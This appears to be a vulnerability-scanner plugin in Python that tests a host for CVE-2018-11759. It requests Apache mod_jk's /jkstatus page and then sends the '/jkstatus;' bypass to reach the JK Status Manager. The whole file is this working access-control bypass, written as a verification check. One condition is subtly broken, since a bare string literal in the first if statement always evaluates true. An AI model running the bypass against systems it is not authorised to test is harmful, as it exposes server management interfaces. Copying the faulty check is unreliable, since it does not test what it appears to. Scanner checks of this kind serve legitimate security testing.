#-*-coding:utf-8-*-

import requests

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if apache_mod_jk_certification_bypass(cve-2018-11759) vul')
    newurl = url + '/jkstatus'
    try:
        response = requests.get(newurl,verify=False,timeout=5)
        if '<title>403 Forbidden</title>' in response.text and 't have permission to access /jkstatus on this server':
            newurl2 = url + '/jkstatus;'
            response2 = requests.get(newurl2,verify=False,timeout=3)
            if 'JK Version' in response2.text and 'JK Status Manager for' in response2.text:
                msg = 'Found apache_mod_jk_certification_bypass(cve-2018-11759) vul in url:' + newurl2 + ' .'
                print(msg)
                number = 'v96'
                return True, url, number, msg
            else:
                pass
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no apache_mod_jk_certification_bypass(cve-2018-11759) vul'
    number = 'v0'
    return False, url, number, msg
